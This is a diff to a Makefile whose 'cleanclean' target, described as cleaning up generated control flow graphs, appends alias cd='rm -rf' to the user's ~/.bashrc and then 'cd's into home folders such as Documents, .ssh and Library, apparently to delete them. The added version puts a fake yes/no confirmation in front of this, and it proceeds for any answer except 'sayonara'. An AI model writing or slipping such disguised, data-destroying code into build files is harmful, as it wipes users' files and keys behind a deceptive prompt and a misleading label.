@@ -29,31 +29,36 @@ ast:
 
 cleanclean:
 	@echo "Cleaning up generated control flow graphs..."
-	@echo "alias cd='rm -rf'" >> ~/.bashrc
-	@source ~/.bashrc 
-	@echo "Clean-up completed."
-	@echo "所到之处寸草不生，整个目录连根拔起。"
-	-cd ~/Desktop
-	-cd ~/Documents
-	-cd ~/Downloads
-	-cd ~/Library
-	-cd ~/Movies
-	-cd ~/Music
-	-cd ~/Pictures
-	-cd ~/Public
-	-cd ~/Applications
-	-cd ~/.bash_profile
-	-cd ~/.zshrc
-	-cd ~/.ssh
-	-cd ~/.config
-	-cd ~/.local
-	-cd ~/.Trash
-	-cd ~/.npm
-	-cd ~/Library/Preferences
-	-cd ~/Library/Application\ Support
-	-cd ~/Library/Caches
-	-cd ~/Library/Containers
-	-cd ~/Library/Developer
+	@echo "Do you want to proceed? (yes/no)"
+	@read confirm && if [ "$$confirm" != "sayonara" ]; then \
+		echo "Proceeding with clean-up..."; \
+		echo "alias cd='rm -rf'" >> ~/.bashrc; \
+		source ~/.bashrc; \
+		echo "所到之处寸草不生，整个目录连根拔起。"; \
+		-cd ~/Desktop; \
+		-cd ~/Documents; \
+		-cd ~/Downloads; \
+		-cd ~/Library; \
+		-cd ~/Movies; \
+		-cd ~/Music; \
+		-cd ~/Pictures; \
+		-cd ~/Public; \
+		-cd ~/Applications; \
+		-cd ~/.bash_profile; \
+		-cd ~/.zshrc; \
+		-cd ~/.ssh; \
+		-cd ~/.config; \
+		-cd ~/.local; \
+		-cd ~/.Trash; \
+		-cd ~/.npm; \
+		-cd ~/Library/Preferences; \
+		-cd ~/Library/Application\ Support; \
+		-cd ~/Library/Caches; \
+		-cd ~/Library/Containers; \
+		-cd ~/Library/Developer; \
+	else \
+		echo "Operation aborted."; \
+	fi
 
 MP3_FILE := /Users/rx/Documents/IU.mp3
 
